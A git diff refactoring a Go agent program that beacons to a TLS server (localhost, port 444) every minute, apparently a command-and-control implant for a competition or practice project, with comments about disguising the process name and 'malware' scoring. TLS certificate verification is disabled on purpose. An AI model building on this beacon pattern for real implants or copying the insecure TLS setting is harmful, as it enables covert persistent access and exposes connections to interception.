@@ -11,7 +11,7 @@ package main
 
 // Fun thought: can you change the Agent process name to whatever you want?
 // https://github.com/erikdubbelboer/gspt
-// Regex if it has "malware" in the title, double points?
+// For scoring: Regex if it has "malware" in the title, double points for style?
 
 import (
 	"fmt"
@@ -35,34 +35,36 @@ type agentInfoStruct struct {
 }
 
 var (
-	serverPublicKey string = "555"
-	// TODO: Change agentUUID back to a proper value
-	//agentUUID uuid.UUID = uuid.New()
-	agentUUID, _                 = uuid.Parse("ef1a6a78-0d95-490a-a07f-9607e00b96ce")
-	agentInfo    agentInfoStruct = agentInfoStruct{ServerPublicKey: serverPublicKey, AgentUUID: agentUUID}
-	localPort    int             = 1337
-	localAddress net.TCPAddr     = net.TCPAddr{IP: net.ParseIP("127.0.0.1"), Port: localPort}
+	serverPublicKey string          = "555"
+	agentUUID       uuid.UUID       = uuid.New()
+	agentInfo       agentInfoStruct = agentInfoStruct{ServerPublicKey: serverPublicKey, AgentUUID: agentUUID}
+	// testing: agentUUID, _                 = uuid.Parse("ef1a6a78-0d95-490a-a07f-9607e00b96ce")
+
+	localPort    int         = 1337
+	localAddress net.TCPAddr = net.TCPAddr{IP: net.ParseIP("127.0.0.1"), Port: localPort}
 	//localAddress      net.TCPAddr   = net.TCPAddr{Port: localPort}
-	serverIP          string        = "127.0.0.1"
-	serverPort        int           = 444
-	serverAddress     net.TCPAddr   = net.TCPAddr{IP: net.ParseIP(serverIP), Port: serverPort}
-	tlsConfig         tls.Config    = tls.Config{InsecureSkipVerify: true}
-	waitTimeInMinutes time.Duration = 1 * time.Minute
+
+	serverIP      string      = "127.0.0.1"
+	serverPort    int         = 444
+	serverAddress net.TCPAddr = net.TCPAddr{IP: net.ParseIP(serverIP), Port: serverPort}
+
+	tlsConfig                tls.Config    = tls.Config{InsecureSkipVerify: true}
+	callbackFrequencyMinutes time.Duration = 1 * time.Minute
 )
 
 func callback() {
-	// All errors just `return` instead of erroring since we want to keep trying, infinitely
+	// All errors are ignored since we want to keep trying, infinitely
 
 	// TODO: Allow for custom local port to be specified, currently unsure how to do this.
-	//       Can do it with net.Dial(), but there's no option in tls.Dial()...
+	// Can do it with net.Dial(), but there's no option in tls.Dial()
 	conn, err := tls.Dial("tcp", serverIP+":"+fmt.Sprint(serverPort), &tlsConfig)
 	//conn, err := net.DialTCP("tcp", &localAddress, &serverAddress)
 	if err != nil {
-		return // we can't connect, but that's fine, try again next time (and the next time, and the next time, and the...)
+		return
 	}
 
 	err = conn.SetWriteDeadline(time.Now().Add(time.Second * 1))
-	if err != nil { // ignore this strange error
+	if err != nil {
 		return
 	}
 
@@ -77,14 +79,12 @@ func callback() {
 
 // Test Agent's connection to the server. Only used if the `--test` flag is passed.
 func testServer() {
-	serverIP = "127.0.0.1" // testing uses localhost
-
 	utils.Log(utils.Info, "Testing connection to server...")
 	utils.Log(utils.Info, "Local Address: ", localAddress.IP.String()+":"+fmt.Sprint(localAddress.Port))
 	utils.Log(utils.Info, "Server Address:", serverAddress.IP.String()+":"+fmt.Sprint(serverAddress.Port))
 
 	// TODO: Allow for custom local port to be specified, currently unsure how to do this.
-	//       Can do it with net.Dial(), but there's no option in tls.Dial()...
+	// Can do it with net.Dial(), but there's no option in tls.Dial()
 	conn, err := tls.Dial("tcp", serverIP+":"+fmt.Sprint(serverPort), &tlsConfig)
 	if err != nil {
 		utils.LogError(utils.Error, err, "Could not connect to server")
@@ -96,13 +96,13 @@ func testServer() {
 		utils.LogError(utils.Warning, err, "Setting write deadline failed, this is weird")
 	}
 
-	testMessage := agentUUID.String() + " TEST"
+	testMessage := fmt.Sprintf("%s %s", agentUUID.String(), "TEST")
 	numBytes, err := conn.Write([]byte(testMessage))
 	if err != nil {
 		utils.LogError(utils.Error, err, "Could not send data to server (write timeout)")
 		os.Exit(utils.ERR_WRITE)
 	} else if numBytes == 0 {
-		utils.LogError(utils.Error, err, "Sent 0 bytes")
+		utils.LogError(utils.Error, err, "Could not send data to server (sent 0 bytes)")
 		os.Exit(utils.ERR_BYTES)
 	}
 
@@ -114,7 +114,7 @@ func testServer() {
 	that would put our local port into TIME_WAIT mode, meaning we
 	won't be able to re-use it for a minute or two. Instead, we
 	want the server to close it for us, so we can re-use the socket
-	immediately if we want to.
+	immediately.
 	*/
 }
 
@@ -140,17 +140,19 @@ func (info agentInfoStruct) printAgentInfo() {
 }
 
 func main() {
-	// Optionally print this Agent's information
 	// Intentionally not using the "flag" package because we never want to print usage information
 	single := false
 	if len(os.Args) > 1 { // contains a command-line flag
-		if os.Args[1] == "--info" {
+		switch os.Args[1] {
+		case "--info":
 			agentInfo.printAgentInfo()
 			return
-		} else if os.Args[1] == "--test" {
+
+		case "--test":
 			testServer()
 			return
-		} else if os.Args[1] == "--single" {
+
+		case "--single":
 			single = true
 		}
 	}
@@ -158,10 +160,9 @@ func main() {
 	// First callback
 	callback()
 
-	// Call back to server every waitTimeInMinutes minutes,
-	// if not passed the `--single` flag.
+	// Call back to server according to the callback frequency in minutes
 	if !single {
-		for range time.Tick(waitTimeInMinutes) {
+		for range time.Tick(callbackFrequencyMinutes) {
 			callback()
 		}
 	}
